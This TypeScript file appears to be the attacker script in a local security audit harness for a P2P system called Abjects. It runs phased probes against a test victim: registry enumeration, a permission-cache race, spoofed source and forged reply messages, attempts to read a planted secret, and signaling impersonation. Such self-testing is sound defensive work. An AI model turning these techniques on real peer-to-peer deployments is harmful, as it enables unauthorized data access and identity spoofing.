/**
 * hack-attacker.ts — Intelligent attacker for P2P security audit.
 *
 * Boots a full Abjects instance, connects to the victim via P2P,
 * and runs a multi-phase attack sequence probing access controls.
 */

import { bootAbjectsCore } from './hack-bootstrap.js';
import { SignalingClient } from '../src/network/signaling.js';
import type { AbjectId } from '../src/core/types.js';
import * as message from '../src/core/message.js';

const SIGNALING_URL = 'ws://localhost:7730';

interface AttackResult {
  id: string;
  phase: number;
  name: string;
  description: string;
  expected: string;
  actual: string;
  status: 'PASS' | 'VULN' | 'INFO' | 'FAIL';
  details?: string;
}

interface VictimInfo {
  peerId: string;
  storageId: string;
  workspaces: Record<string, {
    workspaceId: string;
    registryId: string;
    childIds: string[];
    exposedObjectIds: string[];
  }>;
  workspaceManagerId: string;
  peerRouterId: string;
  workspaceShareRegistryId: string;
}

async function main(): Promise<void> {
  // Register IPC listener BEFORE boot (boot takes many seconds, message may arrive during boot)
  const victimInfoPromise = new Promise<VictimInfo>((resolve) => {
    process.on('message', (msg: { type: string } & VictimInfo) => {
      if (msg.type === 'victimInfo') {
        resolve(msg);
      }
    });
  });

  console.log('[ATTACKER] Booting...');
  const boot = await bootAbjectsCore({ dataDir: '.abjects-hack-attacker', signalingUrl: SIGNALING_URL });
  const { bootstrapRequest, peerRegistryId, peerId, peerRouterObj, bus } = boot;

  console.log(`[ATTACKER] PeerId: ${peerId.slice(0, 16)}...`);

  // Wait for victim info via IPC (should already be resolved)
  const victimInfo = await victimInfoPromise;
  console.log(`[ATTACKER] Got victim info: peerId=${victimInfo.peerId.slice(0, 16)}`);
  const results: AttackResult[] = [];

  // ========================================
  // Establish P2P connection first (before any destructive probes)
  // ========================================

  // S1 - Peer enumeration via signaling (non-destructive, do first)
  console.log('[ATTACKER] === Phase 0: Signaling Probes (S1) ===');
  {
    let peerList: Array<{ peerId: string; name: string; publicSigningKey: string; publicExchangeKey: string }> = [];

    try {
      const client = new SignalingClient();
      let resolved = false;
      await new Promise<void>((resolve) => {
        const done = () => { if (!resolved) { resolved = true; resolve(); } };
        client.on({
          onConnect: () => {
            console.log('[ATTACKER] S1: connected to signaling');
            client.listPeers(peerId);
          },
          onPeerList: (peers) => {
            console.log(`[ATTACKER] S1: got ${peers.length} peers`);
            peerList = peers;
            done();
          },
          onError: () => done(),
        });
        client.connect(SIGNALING_URL).catch(() => done());
        setTimeout(done, 5000);
      });
      client.disconnect().catch(() => {});
    } catch {
      // Signaling probe failed — not critical
    }

    results.push({
      id: 'S1', phase: 0, name: 'Peer enumeration',
      description: 'list-peers leaks peerId + public keys',
      expected: 'INFO (by design)',
      actual: `${peerList.length} peer(s) visible`,
      status: 'INFO',
      details: peerList.length > 0
        ? `Visible: ${peerList.map(p => p.peerId.slice(0, 16)).join(', ')}`
        : 'No peers visible',
    });
    console.log('[ATTACKER] S1 complete');
  }

  // Connect attacker to signaling and establish P2P connection
  console.log('[ATTACKER] Connecting to signaling...');
  await bootstrapRequest(peerRegistryId, 'connectSignaling', { url: SIGNALING_URL });
  await new Promise(resolve => setTimeout(resolve, 2000));

  // Get victim's public keys via signaling
  console.log('[ATTACKER] Finding victim keys via signaling...');
  let victimKeys: { publicSigningKey: string; publicExchangeKey: string; name: string } | null = null;

  try {
    const sigClient = new SignalingClient();
    let resolved = false;
    await new Promise<void>((resolve) => {
      const done = () => { if (!resolved) { resolved = true; resolve(); } };
      sigClient.on({
        onConnect: () => {
          console.log('[ATTACKER] findPeer: connected');
          sigClient.findPeer(victimInfo.peerId);
        },
        onPeerFound: (_peerId, publicSigningKey, publicExchangeKey, name) => {
          console.log('[ATTACKER] findPeer: found victim');
          victimKeys = { publicSigningKey, publicExchangeKey, name };
          done();
        },
        onPeerNotFound: () => {
          console.log('[ATTACKER] findPeer: victim not found');
          done();
        },
        onError: () => done(),
      });
      sigClient.connect(SIGNALING_URL).catch(() => done());
      setTimeout(done, 5000);
    });
    sigClient.disconnect().catch(() => {});
  } catch {
    // non-critical
  }

  if (!victimKeys) {
    console.error('[ATTACKER] FATAL: Cannot find victim keys via signaling');
    process.send!({ type: 'results', attacks: results });
    return;
  }

  await bootstrapRequest(peerRegistryId, 'addContact', {
    peerId: victimInfo.peerId,
    publicSigningKey: victimKeys.publicSigningKey,
    publicExchangeKey: victimKeys.publicExchangeKey,
    name: 'victim',
  });

  // Wait for P2P connection to establish
  console.log('[ATTACKER] Waiting for P2P connection...');
  let connected = false;
  for (let i = 0; i < 20; i++) {
    await new Promise(resolve => setTimeout(resolve, 1000));
    const state = await bootstrapRequest<string>(
      peerRegistryId, 'getContactState', { peerId: victimInfo.peerId },
    );
    if (state === 'connected') {
      connected = true;
      console.log('[ATTACKER] P2P connection established!');
      break;
    }
    console.log(`[ATTACKER] Connection state: ${state} (attempt ${i + 1}/20)`);
  }

  if (!connected) {
    console.log('[ATTACKER] WARNING: P2P connection not established. Attacks may fail.');
  }

  // Wait for route announcements
  await new Promise(resolve => setTimeout(resolve, 3000));

  // ========================================
  // Phase 1 — Reconnaissance (passive)
  // ========================================
  console.log('[ATTACKER] === Phase 1: Reconnaissance ===');

  // R1 - Route capture: check what routes the victim announced
  {
    const routes = await bootstrapRequest<Array<{
      objectId: string; nextHop: string; hops: number;
    }>>(boot.peerRouterId, 'getRoutes', {});

    const victimRoutes = routes.filter(r => r.nextHop === victimInfo.peerId);

    results.push({
      id: 'R1', phase: 1, name: 'Route capture',
      description: 'Log all route announcements from victim',
      expected: 'Only public + system objects',
      actual: `${victimRoutes.length} objects announced`,
      status: victimRoutes.length > 0 ? 'PASS' : 'INFO',
      details: `Route IDs: ${victimRoutes.map(r => r.objectId.slice(0, 8)).join(', ')}`,
    });
  }

  // ========================================
  // Phase 2 — Enumeration (active)
  // ========================================
  console.log('[ATTACKER] === Phase 2: Enumeration ===');

  // Helper to send a request to a remote object via PeerRouter
  const ATTACK_ID = 'attacker' as AbjectId;
  const attackMailbox = bus.register(ATTACK_ID);

  const attackPending = new Map<string, {
    resolve: (v: unknown) => void;
    reject: (e: Error) => void;
    timer: ReturnType<typeof setTimeout>;
  }>();

  // Background loop reads replies from the attacker mailbox
  let attackDone = false;
  const attackLoop = (async () => {
    while (!attackDone) {
      let msg: AbjectMessage;
      try { msg = await attackMailbox.receive(); } catch { break; }
      const pending = attackPending.get(msg.header.correlationId!);
      if (pending) {
        clearTimeout(pending.timer);
        attackPending.delete(msg.header.correlationId!);
        if (msg.header.type === 'error') {
          pending.reject(new Error((msg.payload as { code?: string; message: string }).code ?? (msg.payload as { message: string }).message));
        } else {
          pending.resolve(msg.payload);
        }
      }
    }
  })();

  async function attackRequest<T>(target: AbjectId, method: string, payload: unknown, timeoutMs = 8000): Promise<T> {
    return new Promise((resolve, reject) => {
      const msg = message.request(ATTACK_ID, target, method, payload);
      const timer = setTimeout(() => {
        attackPending.delete(msg.header.messageId);
        reject(new Error('TIMEOUT'));
      }, timeoutMs);
      attackPending.set(msg.header.messageId, {
        resolve: resolve as (v: unknown) => void, reject, timer,
      });
      bus.send(msg).catch(reject);
    });
  }

  // E1 - Public registry list (should succeed)
  {
    const publicWs = victimInfo.workspaces['public'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    try {
      // Resolve remote registry via route
      const registryId = publicWs?.registryId as AbjectId;
      if (registryId) {
        const objects = await attackRequest<unknown[]>(registryId, 'list', {});
        result = `${Array.isArray(objects) ? objects.length : 0} objects returned`;
        status = 'PASS';
      } else {
        result = 'No public registry ID available';
      }
    } catch (err) {
      result = `Error: ${(err as Error).message}`;
      status = (err as Error).message.includes('ACCESS_DENIED') ? 'PASS' : 'FAIL';
    }

    results.push({
      id: 'E1', phase: 2, name: 'Public registry list',
      description: 'list on public workspace registry',
      expected: 'SUCCESS (baseline)',
      actual: result,
      status,
    });
  }

  // E2 - Private registry probe (should be denied)
  {
    const privateWs = victimInfo.workspaces['private'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    try {
      const registryId = privateWs?.registryId as AbjectId;
      if (registryId) {
        const objects = await attackRequest<unknown[]>(registryId, 'list', {});
        result = `LEAKED ${Array.isArray(objects) ? objects.length : '?'} objects`;
        status = 'VULN';
      } else {
        result = 'No private registry ID available';
        status = 'INFO';
      }
    } catch (err) {
      result = `Blocked: ${(err as Error).message}`;
      status = 'PASS';
    }

    results.push({
      id: 'E2', phase: 2, name: 'Private registry probe',
      description: 'list on private workspace registry',
      expected: 'ACCESS_DENIED',
      actual: result,
      status,
    });
  }

  // E3 - Local registry probe (should be denied)
  {
    const localWs = victimInfo.workspaces['local'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    try {
      const registryId = localWs?.registryId as AbjectId;
      if (registryId) {
        const objects = await attackRequest<unknown[]>(registryId, 'list', {});
        result = `LEAKED ${Array.isArray(objects) ? objects.length : '?'} objects`;
        status = 'VULN';
      } else {
        result = 'No local registry ID available';
        status = 'INFO';
      }
    } catch (err) {
      result = `Blocked: ${(err as Error).message}`;
      status = 'PASS';
    }

    results.push({
      id: 'E3', phase: 2, name: 'Local registry probe',
      description: 'list on local workspace registry',
      expected: 'ACCESS_DENIED',
      actual: result,
      status,
    });
  }

  // E4 - WSR probe (should only return public workspaces)
  {
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    try {
      const wsrId = victimInfo.workspaceShareRegistryId as AbjectId;
      const workspaces = await attackRequest<Array<{ name: string; accessMode: string }>>(
        wsrId, 'handleWorkspaceQuery', { fromPeerId: peerId, hops: 0, visited: [peerId] },
      );
      const names = workspaces.map(w => `${w.name}(${w.accessMode})`);
      const hasLocal = workspaces.some(w => w.accessMode === 'local');
      const hasPrivate = workspaces.some(w => w.accessMode === 'private');
      result = `${workspaces.length} workspaces: ${names.join(', ')}`;
      status = hasLocal || hasPrivate ? 'VULN' : 'PASS';
    } catch (err) {
      result = `Error: ${(err as Error).message}`;
      // If we got blocked entirely, that's still a pass
      status = 'PASS';
    }

    results.push({
      id: 'E4', phase: 2, name: 'WSR probe',
      description: 'listSharedWorkspaces on system WSR',
      expected: 'Only public workspaces',
      actual: result,
      status,
    });
  }

  // ========================================
  // Phase 3 — Exploitation
  // ========================================
  console.log('[ATTACKER] === Phase 3: Exploitation ===');

  // X1 - Permission cache race condition
  // The vulnerability: first message to an uncached object passes through
  // while async cache refresh happens (peer-router.ts:549-551)
  {
    const localWs = victimInfo.workspaces['local'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';

    // Pick a child object from the local workspace that should NOT be accessible
    const targetId = localWs?.childIds?.[0] as AbjectId | undefined;
    if (targetId) {
      try {
        // Send describe request — this is the first message to this object,
        // so the permission cache won't have it yet
        const desc = await attackRequest<unknown>(targetId, 'describe', {}, 5000);
        result = `FIRST MESSAGE PASSED THROUGH: got response`;
        status = 'VULN';
      } catch (err) {
        const errMsg = (err as Error).message;
        if (errMsg.includes('ACCESS_DENIED')) {
          result = `Blocked: ${errMsg}`;
          status = 'PASS';
        } else if (errMsg.includes('TIMEOUT')) {
          result = `Timeout (message may have been dropped)`;
          status = 'PASS';
        } else if (errMsg.includes('RECIPIENT_NOT_FOUND')) {
          result = `Object not routable: ${errMsg}`;
          status = 'PASS';
        } else {
          result = `Error: ${errMsg}`;
          status = 'PASS'; // Any error means access was denied
        }
      }
    } else {
      result = 'No local child IDs available to target';
      status = 'INFO';
    }

    results.push({
      id: 'X1', phase: 3, name: 'Permission cache race',
      description: 'Send request to local object before cache populates (peer-router.ts:549-551)',
      expected: 'VULN: first msg passes',
      actual: result,
      status,
    });
  }

  // X2 - Undeliverable fallback
  {
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    const fakeId = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee' as AbjectId;

    try {
      await attackRequest(fakeId, 'list', {}, 5000);
      result = 'Message was delivered to nonexistent object!';
      status = 'VULN';
    } catch (err) {
      const errMsg = (err as Error).message;
      if (errMsg.includes('TIMEOUT')) {
        result = 'Message dropped (timeout)';
        status = 'PASS';
      } else {
        result = `Rejected: ${errMsg}`;
        status = 'PASS';
      }
    }

    results.push({
      id: 'X2', phase: 3, name: 'Undeliverable fallback',
      description: 'Target nonexistent UUID, exploiting bus.send fallback',
      expected: 'Should fail',
      actual: result,
      status,
    });
  }

  // X3 - Spoofed source: send a message with from = victim's own object UUID
  {
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    const localWs = victimInfo.workspaces['local'];
    const spoofedFrom = localWs?.childIds?.[0] as AbjectId | undefined;
    const targetStorage = victimInfo.storageId as AbjectId;

    if (spoofedFrom) {
      try {
        // Craft a message with spoofed source
        const spoofedMsg = message.request(spoofedFrom, targetStorage, 'get', { key: 'secret' });
        // Send via bus — interceptor will try to route it
        await new Promise<void>((resolve, reject) => {
          const timer = setTimeout(() => {
            attackPending.delete(spoofedMsg.header.messageId);
            reject(new Error('TIMEOUT'));
          }, 5000);
          attackPending.set(spoofedMsg.header.messageId, {
            resolve: () => { clearTimeout(timer); resolve(); },
            reject: (e) => { clearTimeout(timer); reject(e); },
            timer,
          });
          bus.send(spoofedMsg).catch(reject);
        });
        result = 'Spoofed message was processed!';
        status = 'VULN';
      } catch (err) {
        const errMsg = (err as Error).message;
        result = `Blocked: ${errMsg}`;
        status = 'PASS';
      }
    } else {
      result = 'No local object ID available to spoof';
      status = 'INFO';
    }

    results.push({
      id: 'X3', phase: 3, name: 'Spoofed source',
      description: 'Message with from = victim own object UUID',
      expected: 'Should fail',
      actual: result,
      status,
    });
  }

  // X4 - Reply bypass: craft a reply message to skip permission check
  {
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';
    const targetStorage = victimInfo.storageId as AbjectId;

    try {
      // Craft a fake reply message addressed to the victim's storage
      const fakeReply: import('../src/core/types.js').AbjectMessage = {
        header: {
          messageId: 'fake-reply-001',
          correlationId: 'fake-original-001',
          sequenceNumber: 1,
          timestamp: Date.now(),
          type: 'reply',
        },
        routing: {
          from: ATTACK_ID,
          to: targetStorage,
          method: 'get',
        },
        payload: { key: 'secret' },
        protocol: { version: '1.0.0' },
      };

      await bus.send(fakeReply);
      // If it went through, the reply would be injected into the victim's bus
      result = 'Reply message sent (may have been routed)';
      status = 'INFO'; // Hard to tell if it actually reached the target
    } catch (err) {
      result = `Blocked: ${(err as Error).message}`;
      status = 'PASS';
    }

    results.push({
      id: 'X4', phase: 3, name: 'Reply bypass',
      description: 'Craft type:reply message to skip permission check (line 462)',
      expected: 'Should fail',
      actual: result,
      status,
    });
  }

  // X5 - Method filter gap: query registry with methods other than list
  {
    const publicWs = victimInfo.workspaces['public'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';

    if (publicWs?.registryId) {
      try {
        const registryId = publicWs.registryId as AbjectId;
        // Try 'resolve' which may leak non-exposed objects
        const resolved = await attackRequest<unknown>(
          registryId, 'resolve', { name: 'Storage' }, 5000,
        );
        if (resolved) {
          result = `resolve('Storage') returned: ${JSON.stringify(resolved).slice(0, 80)}`;
          status = 'VULN';
        } else {
          result = 'resolve returned null';
          status = 'PASS';
        }
      } catch (err) {
        result = `Error: ${(err as Error).message}`;
        status = 'PASS';
      }
    } else {
      result = 'No public registry available';
      status = 'INFO';
    }

    results.push({
      id: 'X5', phase: 3, name: 'Method filter gap',
      description: 'Query registry with methods other than list to leak hidden objects',
      expected: 'May leak',
      actual: result,
      status,
    });
  }

  // ========================================
  // Phase 4 — Exfiltration
  // ========================================
  console.log('[ATTACKER] === Phase 4: Exfiltration ===');

  // F1 - Direct storage read: try to read the secret from Storage
  {
    const targetStorage = victimInfo.storageId as AbjectId;
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';

    try {
      const secret = await attackRequest<string | null>(targetStorage, 'get', { key: 'secret' }, 5000);
      if (secret && String(secret).includes('SECRET_FLAG')) {
        result = `SECRET OBTAINED: ${secret}`;
        status = 'VULN';
      } else if (secret) {
        result = `Got value but not the flag: ${String(secret).slice(0, 40)}`;
        status = 'VULN';
      } else {
        result = 'Storage returned null';
        status = 'PASS';
      }
    } catch (err) {
      const errMsg = (err as Error).message;
      result = `Blocked: ${errMsg}`;
      status = 'PASS';
    }

    results.push({
      id: 'F1', phase: 4, name: 'Direct storage read',
      description: 'get({ key: secret }) on local Storage',
      expected: 'VULN if X1 worked',
      actual: result,
      status,
    });
  }

  // F2 - Introspect pivot: describe() on any reached local object
  {
    const localWs = victimInfo.workspaces['local'];
    let result = 'no response';
    let status: AttackResult['status'] = 'FAIL';

    // Try to describe a local child
    const targetId = localWs?.childIds?.[1] as AbjectId | undefined;
    if (targetId) {
      try {
        const desc = await attackRequest<unknown>(targetId, 'describe', {}, 5000);
        if (desc) {
          result = `Got description of local object: ${JSON.stringify(desc).slice(0, 80)}`;
          status = 'VULN';
        } else {
          result = 'describe returned null';
          status = 'PASS';
        }
      } catch (err) {
        const errMsg = (err as Error).message;
        result = `Blocked: ${errMsg}`;
        status = 'PASS';
      }
    } else {
      result = 'No local child IDs to introspect';
      status = 'INFO';
    }

    results.push({
      id: 'F2', phase: 4, name: 'Introspect pivot',
      description: 'describe() on any reached local object to map further targets',
      expected: 'Depends on X1',
      actual: result,
      status,
    });
  }

  // ========================================
  // S2 — Impersonation (destructive — run last)
  // ========================================
  console.log('[ATTACKER] === S2: Impersonation (post-attack) ===');
  {
    let impersonationResult = 'unknown';
    let overwritten = false;

    try {
      const client = new SignalingClient();
      let r1 = false;
      await new Promise<void>((resolve) => {
        const done = () => { if (!r1) { r1 = true; resolve(); } };
        client.on({
          onConnect: () => {
            client.register(victimInfo.peerId, 'fake-key', 'fake-key', 'impersonator');
            setTimeout(done, 2000);
          },
          onError: (err) => {
            impersonationResult = `blocked: ${err}`;
            done();
          },
        });
        client.connect(SIGNALING_URL).catch(() => done());
        setTimeout(done, 5000);
      });

      // Check if victim's registration was overwritten
      const client2 = new SignalingClient();
      let victimStillRegistered = false;
      let r2 = false;
      await new Promise<void>((resolve) => {
        const done = () => { if (!r2) { r2 = true; resolve(); } };
        client2.on({
          onConnect: () => {
            client2.listPeers('none');
          },
          onPeerList: (peers) => {
            victimStillRegistered = peers.some(p => p.peerId === victimInfo.peerId);
            done();
          },
          onError: () => done(),
        });
        client2.connect(SIGNALING_URL).catch(() => done());
        setTimeout(done, 5000);
      });

      client.disconnect().catch(() => {});
      client2.disconnect().catch(() => {});
      overwritten = !victimStillRegistered;
    } catch {
      impersonationResult = 'probe failed';
    }
    results.push({
      id: 'S2', phase: 0, name: 'Impersonation',
      description: 'Register with victim peerId',
      expected: 'Should be blocked',
      actual: overwritten ? 'REGISTRATION OVERWROTE VICTIM' : 'Victim still registered',
      status: overwritten ? 'VULN' : 'PASS',
      details: impersonationResult,
    });
  }

  // Clean up
  attackDone = true;
  bus.unregister(ATTACK_ID);

  // Send results to orchestrator
  console.log(`[ATTACKER] Sending ${results.length} results...`);
  process.send!({ type: 'results', attacks: results });

  // Wait for shutdown
  process.on('message', (msg: { type: string }) => {
    if (msg.type === 'shutdown') {
      console.log('[ATTACKER] Shutting down...');
      boot.runtime.stop().then(() => process.exit(0));
    }
  });
}

main().catch((err) => {
  console.error('[ATTACKER] Fatal:', err);
  process.exit(1);
});
